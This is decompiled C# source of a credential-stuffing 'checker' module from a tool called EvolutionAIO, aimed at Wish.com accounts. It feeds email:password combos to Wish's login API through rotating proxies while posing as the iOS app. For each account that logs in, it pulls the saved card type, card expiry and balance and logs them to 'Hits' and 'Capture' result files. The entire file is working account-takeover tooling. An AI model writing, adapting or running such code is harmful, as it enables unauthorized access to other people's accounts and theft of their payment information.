// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Wish
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class Wish
  {
    public static bool check(string[] s, string proxy)
    {
      try
      {
        using (HttpRequest httpRequest = new HttpRequest())
        {
          proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
          if (Menu.proxyProtocol == "HTTP")
            httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS4")
            httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS5")
            httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
          httpRequest.IgnoreProtocolErrors = true;
          string str1 = "_app_type=wish&_capabilities%5B%5D=2&_capabilities%5B%5D=4&_capabilities%5B%5D=3&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=32&_capabilities%5B%5D=33&_capabilities%5B%5D=35&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=55&_capabilities%5B%5D=61&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=70&_capabilities%5B%5D=72&_capabilities%5B%5D=76&_capabilities%5B%5D=77&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=84&_capabilities%5B%5D=88&_capabilities%5B%5D=89&_capabilities%5B%5D=78&_capabilities%5B%5D=92&_capabilities%5B%5D=93&_capabilities%5B%5D=94&_capabilities%5B%5D=95&_capabilities%5B%5D=97&_capabilities%5B%5D=98&_capabilities%5B%5D=99&_capabilities%5B%5D=105&_capabilities%5B%5D=106&_capabilities%5B%5D=110&_capabilities%5B%5D=120&_capabilities%5B%5D=127&_capabilities%5B%5D=123&_capabilities%5B%5D=125&_capabilities%5B%5D=130&_capabilities%5B%5D=131&_capabilities%5B%5D=135&_capabilities%5B%5D=145&_capabilities%5B%5D=117&_capabilities%5B%5D=147&_capabilities%5B%5D=158&_capabilities%5B%5D=156&_capabilities%5B%5D=161&_capabilities%5B%5D=164&_capabilities%5B%5D=167&_capabilities%5B%5D=124&_cashshield_session_id=3EBD45C2-6163-40E6-9439-DAAAAC68D9CB&_client=iosapp&_riskified_session_token=B9AF7473-866A-4498-B68B-EF753AC7B7AA&_threat_metrix_session_token=7625-D5C2C287-36DD-4575-93EA-A0E923EBFA74&_version=4.18.7&_xsrf=1&app_device_id=4b45a41263a3f84067940981aafdfe58b34d0132&app_device_model=iPhone9%2C3&email=" + s[0] + "&from_ad=false&icloud_autologin=false&password=" + s[1] + "&session_refresh=false";
          httpRequest.Cookies.Set("_xsrf", "1", ".wish.com");
          httpRequest.AddHeader("Host", "www.wish.com");
          httpRequest.AddHeader("Accept", "*/*");
          httpRequest.AddHeader("User-Agent", "Wish/4.18.7 (com.contextlogic.Wish; build:1029; iOS 12.0.1) Alamofire/4.8.2");
          httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
          HttpResponse httpResponse1 = httpRequest.Post("https://www.wish.com/api/email-login", str1, "application/x-www-form-urlencoded");
          if (httpResponse1.ToString().Contains("\"session_token\":"))
          {
            Save.AsResult(nameof (Wish), "R", httpResponse1.ToString());
            httpRequest.ClearAllHeaders();
            string str2 = "_app_type=wish&_capabilities%5B%5D=2&_capabilities%5B%5D=4&_capabilities%5B%5D=3&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=32&_capabilities%5B%5D=33&_capabilities%5B%5D=35&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=55&_capabilities%5B%5D=61&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=70&_capabilities%5B%5D=72&_capabilities%5B%5D=76&_capabilities%5B%5D=77&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=84&_capabilities%5B%5D=88&_capabilities%5B%5D=89&_capabilities%5B%5D=78&_capabilities%5B%5D=92&_capabilities%5B%5D=93&_capabilities%5B%5D=94&_capabilities%5B%5D=95&_capabilities%5B%5D=97&_capabilities%5B%5D=98&_capabilities%5B%5D=99&_capabilities%5B%5D=105&_capabilities%5B%5D=106&_capabilities%5B%5D=110&_capabilities%5B%5D=120&_capabilities%5B%5D=127&_capabilities%5B%5D=123&_capabilities%5B%5D=125&_capabilities%5B%5D=130&_capabilities%5B%5D=131&_capabilities%5B%5D=135&_capabilities%5B%5D=145&_capabilities%5B%5D=117&_capabilities%5B%5D=147&_capabilities%5B%5D=158&_capabilities%5B%5D=156&_capabilities%5B%5D=161&_capabilities%5B%5D=164&_capabilities%5B%5D=167&_capabilities%5B%5D=124&_cashshield_session_id=3EBD45C2-6163-40E6-9439-DAAAAC68D9CB&_client=iosapp&_riskified_session_token=B9AF7473-866A-4498-B68B-EF753AC7B7AA&_threat_metrix_session_token=7625-D5C2C287-36DD-4575-93EA-A0E923EBFA74&_version=4.18.7&_xsrf=1&app_device_id=4b45a41263a3f84067940981aafdfe58b34d0132&app_device_model=iPhone9%2C3&supports_mobile_action_dict=true";
            httpRequest.AddHeader("Host", "www.wish.com");
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("User-Agent", "Wish/1029 CFNetwork/974.2.1 Darwin/18.0.0");
            HttpResponse httpResponse2 = httpRequest.Post("https://www.wish.com/api/settings/get", str2, "application/x-www-form-urlencoded");
            Save.AsResult(nameof (Wish), "R1", httpResponse2.ToString());
            string str3;
            try
            {
              str3 = Menu.Parse(httpResponse2.ToString(), "card_type\":\"", "\"");
            }
            catch
            {
              str3 = "N/A";
            }
            string str4;
            try
            {
              str4 = Menu.Parse(httpResponse2.ToString(), "expiry_month\":\"", "\"");
            }
            catch
            {
              str4 = "N/A";
            }
            string str5;
            try
            {
              str5 = Menu.Parse(httpResponse2.ToString(), "expiry_year\":\"", "\"");
            }
            catch
            {
              str5 = "N/A";
            }
            string str6 = str4 + "/" + str5;
            string str7;
            try
            {
              str7 = Menu.Parse(httpResponse2.ToString(), "preferred_currency\":\"", "\"");
            }
            catch
            {
              str7 = "N/A";
            }
            httpRequest.ClearAllHeaders();
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            HttpResponse httpResponse3 = httpRequest.Post("https://www.wish.com/api/user/status", "_app_type=wish&_capabilities%5B%5D=2&_capabilities%5B%5D=4&_capabilities%5B%5D=3&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=32&_capabilities%5B%5D=33&_capabilities%5B%5D=35&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=55&_capabilities%5B%5D=61&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=70&_capabilities%5B%5D=72&_capabilities%5B%5D=76&_capabilities%5B%5D=77&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=84&_capabilities%5B%5D=88&_capabilities%5B%5D=89&_capabilities%5B%5D=78&_capabilities%5B%5D=92&_capabilities%5B%5D=93&_capabilities%5B%5D=94&_capabilities%5B%5D=95&_capabilities%5B%5D=97&_capabilities%5B%5D=98&_capabilities%5B%5D=99&_capabilities%5B%5D=105&_capabilities%5B%5D=106&_capabilities%5B%5D=110&_capabilities%5B%5D=120&_capabilities%5B%5D=127&_capabilities%5B%5D=123&_capabilities%5B%5D=125&_capabilities%5B%5D=130&_capabilities%5B%5D=131&_capabilities%5B%5D=135&_capabilities%5B%5D=145&_capabilities%5B%5D=117&_capabilities%5B%5D=147&_capabilities%5B%5D=158&_capabilities%5B%5D=156&_capabilities%5B%5D=161&_capabilities%5B%5D=164&_capabilities%5B%5D=167&_capabilities%5B%5D=124&_cashshield_session_id=3EBD45C2-6163-40E6-9439-DAAAAC68D9CB&_client=iosapp&_riskified_session_token=B9AF7473-866A-4498-B68B-EF753AC7B7AA&_threat_metrix_session_token=7625-D5C2C287-36DD-4575-93EA-A0E923EBFA74&_version=4.18.7&_xsrf=1&app_device_id=4b45a41263a3f84067940981aafdfe58b34d0132&app_device_model=iPhone9%2C3&supports_mobile_action_dict=true", "application/x-www-form-urlencoded");
            Save.AsResult(nameof (Wish), "R2", httpResponse3.ToString());
            string str8 = str7 + Menu.Parse(httpResponse3.ToString(), "localized_value\":\"", "\"");
            if (httpResponse3.ToString().Contains("{\"localized_amount\": {\"localized_value\": 0.0,"))
            {
              ++Menu.frees;
              if (Menu.p1 == "2")
                Colorful.Console.WriteLine(" [/] " + s[0] + ":" + s[1] + " | FREE", Color.Yellow);
              Save.AsResult(nameof (Wish), "Frees", s[0] + ":" + s[1] + " | FREE");
              return false;
            }
            ++Menu.hits;
            if (Menu.p1 == "2")
              Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + " | Balance: " + str8, Color.Green);
            Save.AsResult(nameof (Wish), "Capture", s[0] + ":" + s[1] + " | Balance: " + str8 + " ~ Card Info: " + str6 + " " + str3);
            Save.AsResult(nameof (Wish), "Hits", s[0] + ":" + s[1]);
            return false;
          }
          if (httpResponse1.ToString().Contains("Email or Password is incorrect"))
            return false;
          Save.AsResult(nameof (Wish), "RElse", httpResponse1.ToString());
        }
      }
      catch (Exception ex)
      {
        if (ex.ToString().Contains("Index was outside the bounds of the array"))
          return false;
        Save.AsResult(nameof (Wish), "errors", ex.ToString());
        ++Menu.errors;
      }
      return false;
    }
  }
}
